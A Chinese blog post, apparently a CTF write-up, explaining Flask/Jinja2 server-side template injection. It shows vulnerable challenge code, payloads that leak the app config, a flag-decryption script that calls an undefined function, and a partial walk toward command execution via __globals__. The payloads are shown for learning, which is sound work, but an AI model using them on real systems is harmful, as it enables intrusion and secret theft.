@@ -1,0 +1,306 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>记一道典型的flask SSTI题目 - Lamber&#39;s Blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Lamber,"> 
+    <meta name="description" content="一、概念了解及环境搭建1. 一些新概念
+PyCharm是一种Python IDE，带有一整套可以帮助用户在使用Python语言开发时提高其效率的工具，比如调试、语法高亮、Project管理、代码跳转,"> 
+    <meta name="author" content="Lamber"> 
+    <link rel="alternative" href="atom.xml" title="Lamber&#39;s Blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Lamber&#39;s Blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">记一道典型的flask SSTI题目</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">记一道典型的flask SSTI题目</h1>
+        <div class="stuff">
+            <span>八月 30, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/flask/" rel="tag">flask</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h2 id="一、概念了解及环境搭建"><a href="#一、概念了解及环境搭建" class="headerlink" title="一、概念了解及环境搭建"></a>一、概念了解及环境搭建</h2><h3 id="1-一些新概念"><a href="#1-一些新概念" class="headerlink" title="1. 一些新概念"></a>1. 一些新概念</h3><ol>
+<li>PyCharm是一种Python IDE，带有一整套可以帮助用户在使用Python语言开发时提高其效率的工具，比如调试、语法高亮、Project管理、代码跳转、智能提示、自动完成、单元测试、版本控制。此外，该IDE提供了一些高级功能，以用于支持Django框架下的专业Web开发。</li>
+<li>IDE: 集成开发环境(Integrated Development Environment)是用于提供程序开发环境的应用程序。简单来说就是提高程序员开发效率的东西。</li>
+<li>web服务器, 应用服务器：处理逻辑的服务器，处理php,python,不能直接通过nginx这种web服务器来处理。eg, uwsgi处理Python;</li>
+<li>常见web应用框架: flask, django</li>
+</ol>
+<h3 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2. 环境搭建"></a>2. 环境搭建</h3><p>工具准备：python3 &amp; PyCharm</p>
+<p>1.flask搭建过程</p>
+<p>1.安装python3虚拟环境</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -m venv venv  --&gt; 安装虚拟环境（第二个venv指虚拟环境的名字）</span><br><span class="line">venv\Scripts\activate --&gt; 启动虚拟环境</span><br><span class="line">deactivate            --&gt; 关闭虚拟环境</span><br></pre></td></tr></table></figure>
+
+<p>安装虚拟环境主要是为了不让flask测试框架所安装的一些python模块, 影响自己本机的python环境。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip install Flask                   --&gt;  pip版本过低</span><br><span class="line">python -m pip install --upgrade pip --&gt;  更新pip版本</span><br><span class="line">pip install Flask                   --&gt;  成功安装Flask</span><br><span class="line">pip list                            --&gt;  python所安装模块查询版本成功√</span><br></pre></td></tr></table></figure>
+
+<p>2.PyCharm使用:<br>File –&gt; New Project 创建一个新项目<br>File –&gt; Settings –&gt; Project:Project Interpreter 设置python路径, 然后选择pip然后可以安装python相应模块</p>
+<p>参考文章: </p>
+<ol>
+<li>《pycharm使用教程看这篇就足够了》 <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2a4d388b86e9">https://www.jianshu.com/p/2a4d388b86e9</a></li>
+</ol>
+<h2 id="二、flask框架学习"><a href="#二、flask框架学习" class="headerlink" title="二、flask框架学习"></a>二、flask框架学习</h2><p><strong>一、用flask写一个hello world:</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>) </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>导入<code>Flask</code>类</li>
+<li>创建一个该类的实例</li>
+<li>用<code>route()</code>装饰器来告诉<code>Flask</code>触发函数的<code>URL</code></li>
+<li>函数名称被用来生成相关联的URL</li>
+<li>最后返回需要在用户浏览器中显示的信息</li>
+</ol>
+<p><strong>二、让这个 “hello world” 跑起来的方法</strong></p>
+<ol>
+<li><p>powershell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">env:FLASK_APP=<span class="string">&quot;flaskr&quot;</span>    --&gt;  flaskr指项目名称</span></span><br><span class="line">flask run</span><br></pre></td></tr></table></figure></li>
+<li><p>cmd</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set FLASK_APP=flaskr       --&gt;  flaskr指项目名称</span><br><span class="line">set FLASK_ENV=development</span><br><span class="line">flask run</span><br></pre></td></tr></table></figure></li>
+<li><p>linux</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">export</span> FLASK_APP=flaskr  --&gt;  flaskr指项目名称</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> flask run</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<p><strong>三、如果使用PyCharm:</strong><br>如果是使用PyCharm来运行flask的话, 就会很简单。代码写好之后直接右键选择run, 就可以运行了</p>
+<p>参考文章:</p>
+<ol>
+<li>参考教程w3cschool <a target="_blank" rel="noopener" href="https://www.w3cschool.cn/flask/flask_overview.html">https://www.w3cschool.cn/flask/flask_overview.html</a></li>
+<li>flask框架参考flask中文文档 <a target="_blank" rel="noopener" href="https://dormousehole.readthedocs.io/en/latest/">https://dormousehole.readthedocs.io/en/latest/</a></li>
+<li><code>if __name__ == &#39;__main__&#39;</code>的理解参考<code>《如何简单地理解python中的if __name__ == &#39;__main__&#39;》</code><a target="_blank" rel="noopener" href="https://blog.csdn.net/yjk13703623757/article/details/77918633/">https://blog.csdn.net/yjk13703623757/article/details/77918633/</a></li>
+</ol>
+<h2 id="三、解题过程"><a href="#三、解题过程" class="headerlink" title="三、解题过程"></a>三、解题过程</h2><p>题目源码如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, render_template, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;evoa@Syclover | https://evoa.me 233333&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">line, key, key2</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(x ^ <span class="built_in">ord</span>(line[x]) ^ <span class="built_in">ord</span>(key[::-<span class="number">1</span>][x]) ^ <span class="built_in">ord</span>(key2[x])) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(line)))</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/app/flag&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">flag = file.read()</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;flag&#x27;</span>] = encode(flag,<span class="string">&#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#x27;</span>,<span class="string">&#x27;xwdFqMck1vA0pl7B8WO3DrG</span></span><br><span class="line"><span class="string">Lma4sZ2Y6ouCPEHSQVT&#x27;</span>)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">os.remove(<span class="string">&quot;/app/flag&quot;</span>)</span><br><span class="line">nicknames = [<span class="string">&#x27;˜”*°★☆★_%s_★☆★°°*&#x27;</span>, <span class="string">&#x27;%s ~♡ⓛⓞⓥⓔ♡~&#x27;</span>, <span class="string">&#x27;%s Вêчңø в øĤлâйĤé&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;♪ ♪ ♪ %s ♪ ♪ ♪ &#x27;</span>, <span class="string">&#x27;[♥♥♥%s♥♥♥]&#x27;</span>, <span class="string">&#x27;%s, kOтO®Aя )(оТеЛ@ ©4@$tьЯ&#x27;</span>, <span class="string">&#x27;♔%s♔&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;[♂+♂=♥]%s[♂+♂=♥]&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = request.values.get(<span class="string">&#x27;nickname&#x27;</span>)</span><br><span class="line">            <span class="built_in">id</span> = random.randint(<span class="number">0</span>, <span class="built_in">len</span>(nicknames) - <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> p != <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> p <span class="keyword">or</span> <span class="string">&#x27;_&#x27;</span> <span class="keyword">in</span> p <span class="keyword">or</span> <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">in</span> p:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;Your nickname contains restricted characters!&#x27;</span></span><br><span class="line">                <span class="keyword">return</span> render_template_string(nicknames[<span class="built_in">id</span>] % p)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Exception&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/syc&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">syc</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> request.args.get(<span class="string">&#x27;name&#x27;</span>) <span class="keyword">or</span> <span class="string">&quot;&#x27;&quot;</span> <span class="keyword">in</span> request.args.get(<span class="string">&#x27;name&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">in</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;nonono&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(request.args.get(<span class="string">&#x27;name&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">1337</span>)</span><br></pre></td></tr></table></figure>
+
+<p>分析题目源码<br>该题目定义了两个路由</p>
+<ol>
+<li><code>@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])</code></li>
+<li><code>@app.route(&#39;/syc&#39;)</code></li>
+</ol>
+<h3 id="1-配置里的flag"><a href="#1-配置里的flag" class="headerlink" title="1. 配置里的flag"></a>1. 配置里的flag</h3><p>路由 <code>@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])</code> 作用为:<br>如果是POST请求，则将用户输入(nickname)赋值给参数p。否则直接返回index.html<br>如果参数p中(即nickname中)含有 <code>.</code>, <code>_</code>, <code>\&#39;</code> （点号, 下划线, 单引号）则返回值: <code>Your nickname contains restricted characters!</code><br>如果参数p中不包含非法字符, 则在数组nicknames中随机取出一个元素, 将用户输入(nickname)格式化输出。并且在输出时受到 <code>render_template_string()</code> 函数的影响</p>
+<p>对于 <code>render_template_string()</code> 函数<br>查阅flask官方文档可知, 在Flask中, Jinja2默认配置如下</p>
+<blockquote>
+<ul>
+<li>当使用 render_template() 时，扩展名为 .html 、 .htm 、 .xml 和 .xhtml 的模板中开启自动转义。</li>
+<li>当使用 render_template_string() 时，字符串开启 自动转义。</li>
+<li>在模板中可以使用<code>&#123;% autoescape %&#125;</code>来手动设置是否转义。</li>
+<li>Flask 在 Jinja2 环境中加入一些全局函数和辅助对象，以增强模板的功能。</li>
+</ul>
+</blockquote>
+<p>也就是说, <code>render_template_string()</code> 函数会将字符串以Jinja2模板的渲染规则进行转义。</p>
+<p>查阅Jinja2官方文档可知, 在Jinja2中, 默认定界符(delimiters)有如下几种:</p>
+<blockquote>
+<ul>
+<li><code>&#123;% ... %&#125;</code> for <a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/2.10.x/templates/#list-of-control-structures">Statements</a></li>
+<li><code>&#123;&#123; ... &#125;&#125;</code> for <a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/2.10.x/templates/#expressions">Expressions</a> to print to the template output</li>
+<li><code>&#123;# ... #&#125;</code> for <a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/2.10.x/templates/#comments">Comments</a> not included in the template output</li>
+<li><code>#  ... ##</code> for <a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/2.10.x/templates/#line-statements">Line Statements</a></li>
+</ul>
+</blockquote>
+<p>简单来说: </p>
+<ol>
+<li><p><code>&#123;% ... %&#125;</code> 是用来控制程序流程的定界符, 例如条件语句, 循环语句。使用语法与python类似, 但要注意在语法结束时要添加 <code>&#123;% endif %&#125;</code>, <code>&#123;% endfor %&#125;</code>…。一个简单的利用 <code>for</code> 循环, 遍历 <code>username</code> 的示例如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;Members&lt;/h1&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">&#123;% for user in users %&#125;</span><br><span class="line">  &lt;li&gt;&#123;&#123; user.username|e &#125;&#125;&lt;/li&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure></li>
+<li><p><code>&#123;&#123; ... &#125;&#125;</code> 是允许使用基本表达式的定界符, 并将结果输出<br>例如: <code>&#123;&#123; 7*7 &#125;&#125;</code> 的返回值就是 <code>49</code></p>
+</li>
+<li><p><code>&#123;# ... #&#125;</code> 用于注释一整块语句, 注释用法如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;# note: commented-out template because we no longer use this</span><br><span class="line">    &#123;% for user in users %&#125;</span><br><span class="line">        ...</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">#&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p><code>#  ... ##</code> 用于注释一行语句, 注释用法如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># for item in seq:</span><br><span class="line">    &lt;li&gt;&#123;&#123; item &#125;&#125;&lt;/li&gt;     ## this comment is ignored</span><br><span class="line"># endfor</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>参考flask模板 <a target="_blank" rel="noopener" href="https://dormousehole.readthedocs.io/en/latest/templating.html?highlight=render_template_string#id2">https://dormousehole.readthedocs.io/en/latest/templating.html?highlight=render_template_string#id2</a></p>
+<blockquote>
+<p>缺省情况下，以下全局变量可以在 Jinja2 模板中使用:<br>config: 当前配置对象<br>request: 当前请求对象, 在没有活动请求环境情况下渲染模板时，这个变量不可用。<br>session: 当前会话对象, 在没有活动请求环境情况下渲染模板时，这个变量不可用。<br>g: 请求绑定的全局变量, 在没有活动请求环境情况下渲染模板时，这个变量不可用。</p>
+</blockquote>
+<p>既然config是全局变量, 而 <code>&#123;&#123; ... &#125;&#125;</code> 可以将基本表达式的结果输出, 并且 <code>render_template_string()</code> 会将字符串以Jinja2的规则转义。那是否可以利用 <code>render_template_string()</code> 先将 <code>&quot;&#123;&#123; ... &#125;&#125;&quot;</code> 字符串转义成Jinja2模板格式, 而转义之后就成了 <code>&#123;&#123; ... &#125;&#125;</code> 定界符, 再利用这个定界符输出 config 这个全局变量呢。<br>于是我搭建了一个测试环境, 代码跟输出结果如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;&#123;&#123; config &#125;&#125;&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/08/30/%E8%AE%B0%E4%B8%80%E9%81%93%E5%85%B8%E5%9E%8B%E7%9A%84flask-SSTI%E9%A2%98%E7%9B%AE/1.jpg" class="">
+
+
+<p>很好, 可以看到成功读取到了 config 全局变量。<br>感觉到第一个flag就在眼前!<br>访问题目, 输入 <code>&#123;&#123; config &#125;&#125;</code></p>
+<img src="/2021/08/30/%E8%AE%B0%E4%B8%80%E9%81%93%E5%85%B8%E5%9E%8B%E7%9A%84flask-SSTI%E9%A2%98%E7%9B%AE/2.png" class="">
+
+<p>是flag!<br>不过有点遗憾的是, flag是加了密的。回到题目中, 再仔细看看代码。找到加密flag的部分:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">line, key, key2</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(x ^ <span class="built_in">ord</span>(line[x]) ^ <span class="built_in">ord</span>(key[::-<span class="number">1</span>][x]) ^ <span class="built_in">ord</span>(key2[x])) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(line)))</span><br><span class="line">    </span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/app/flag&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">flag = file.read()</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;flag&#x27;</span>] = encode(flag,<span class="string">&#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#x27;</span>,<span class="string">&#x27;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#x27;</span>)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">os.remove(<span class="string">&quot;/app/flag&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>观察 <code>encode()</code> 函数, 发现返回值是由 <code>x</code>, <code>ord(line[x])</code>, <code>ord(key[::-1][x])</code>, <code>ord(key2[x])</code> 四部分亦或得到。<br>亦或参考文章<br>1）：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/tmdsleep/p/9933647.html">https://www.cnblogs.com/tmdsleep/p/9933647.html</a><br>2）：<a target="_blank" rel="noopener" href="http://www.elecfans.com/d/653831.html">http://www.elecfans.com/d/653831.html</a></p>
+<p>通过学习异或运算可知:</p>
+<blockquote>
+<p>如果a、b两个值不相同，则异或结果为1。 如果a、b两个值相同，异或结果为0。 异或也叫半加运算，其运算法则相当于不带进位的二进制加法：二进制下用1表示真，0表示假，则异或的运算法则为：0⊕0=0，1⊕0=1，0⊕1=1，1⊕1=0（同为0，异为1），这些法则与加法是相同的，只是不带进位，所以异或常被认作不进位加法。</p>
+</blockquote>
+<p>而关于异或运算, 有一个推论<br>e = a ^ b ^ c ^ d 与<br>b = a ^ c ^ d ^ e 相等效</p>
+<p>又查询资料可知<br>ord()是将字符转换成ASCII；<br>chr()是将ASCII转换成字符<br>在加密flag的时候, 是将flag作为参数line传入。也就是说 <code>for x in range(len(line))</code> 的作用是获取flag中每一个字符的坐标, <code>ord(line[x])</code> 就是将flag中每一个字符转换成ASCII。</p>
+<p>即加密flag部分, 可以简单理解为:<br><code>密文 = x ^ flag ^ ord(key[::-1][x]) ^ ord(key2[x])</code></p>
+<p>根据推论解密flag, 即:<br><code>flag = x ^ 密文 ^ ord(key[::-1][x]) ^ ord(key2[x])</code></p>
+<p>解密脚本:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">encrypt_flag, key, key2</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(x ^ <span class="built_in">ord</span>(encrypt_flag[x]) ^ <span class="built_in">ord</span>(key[::-<span class="number">1</span>][x]) ^ <span class="built_in">ord</span>(key2[x])) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encrypt_flag)))</span><br><span class="line">    </span><br><span class="line">encrypt_flag = <span class="string">&quot;\x18X5\x0cx\x19k&#125;\r\x01a\x0c\x1fT\x16X?hl\x1e\\OLL(n\x17\x0fi]B\x0fh8&quot;</span></span><br><span class="line">key = <span class="string">&quot;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&quot;</span></span><br><span class="line">key2 = <span class="string">&quot;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decode(encrypt_flag, key, key2))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Syc&#123;this_1s_Twice_interv1ew_F14g&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>解码得到第一个flag:<br><code>Syc&#123;this_1s_Twice_interv1ew_F14g&#125;</code></p>
+<p>其实仔细看一下, 构造的解密脚本其实和原加密脚本一样。</p>
+<h3 id="2-根目录下的flag"><a href="#2-根目录下的flag" class="headerlink" title="2. 根目录下的flag"></a>2. 根目录下的flag</h3><p>任务中说, 第二个flag在根目录下面, 于是想到利用模板注入漏洞达到命令执行的效果, 从而读取到根目录的文件。</p>
+<p>查阅跟模板注入的有关文档可知</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3679">https://xz.aliyun.com/t/3679</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</a></li>
+</ol>
+<p>想要利用模板注入来达到命令执行的效果, 需要调用python的基类<br>首先利用 <code>__class__</code> 查询全局变量 <code>config</code> 的参数类型, 即 <code>&#123;&#123; config.__class__ &#125;&#125;</code>。执行查询, 结果如下。</p>
+<img src="/2021/08/30/%E8%AE%B0%E4%B8%80%E9%81%93%E5%85%B8%E5%9E%8B%E7%9A%84flask-SSTI%E9%A2%98%E7%9B%AE/3.png" class="">
+
+<p>感到疑惑, 再回到题目源码。看到在 <code>@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])</code> 路由里, 过滤了参数 nickname 中的 <code>_</code> 和<code>.</code>。调用python基类所必须的下划线被过滤了, 所以查询全局变量 <code>config</code> 的类失败了。</p>
+<p>既然第一个路由已经把路封上了, 这时候去读第二个路由 <code>@app.route(&#39;/syc&#39;)</code> 的源码。发现过滤了 <code>.</code>, <code>&#39;</code>, <code>&quot;</code>。点号也被过滤了, 感觉题目已经无解了。这时候想到, 虽然调用基类的下划线是必须的, 绕不过去, 但是是否可以绕过点号的使用。百度查询很久, 没有发现任何绕过点号的方法。然后在群里看到师傅说, 把点号的限制删除了。这时候又可以继续做题了! </p>
+<p>分析 <code>@app.route(&#39;/syc&#39;)</code> 这个路由, 利用 <code>request.args.get(&#39;name&#39;)</code> 以GET方式传入了一个name参数, 再通过 <code>render_template_string()</code> 函数将name以Jinja2模板的渲染规则进行转义。</p>
+<p>先尝试读取全局变量: <code>http://114.116.44.23:58470/syc?name=&#123;&#123; config &#125;&#125;</code>, 成功得到config的值。</p>
+<img src="/2021/08/30/%E8%AE%B0%E4%B8%80%E9%81%93%E5%85%B8%E5%9E%8B%E7%9A%84flask-SSTI%E9%A2%98%E7%9B%AE/4.png" class="">
+
+<p>这时候发现, 对于配置里的flag, 不仅可以通过第一个路由读取, 而且第二个路由也可以读取到这个配置里的flag。</p>
+<p>继续读取根目录flag之路:<br>再次尝试读取全局变量 <code>config</code> 的参数类型, <code>http://114.116.44.23:58470/syc?name=&#123;&#123; config.__class__ &#125;&#125;</code> 得到返回结果 <code>&lt;class &#39;flask.config.Config&#39;&gt;</code></p>
+<p>然后利用 <code>__init__</code> 初始化类<br>再加 <code>__globals__</code> 全局查询所有的方法及变量及参数<br><code>http://114.116.44.23:58470/syc?name=&#123;&#123; config.__class__.__init__.__globals__ &#125;&#125;</code></p>
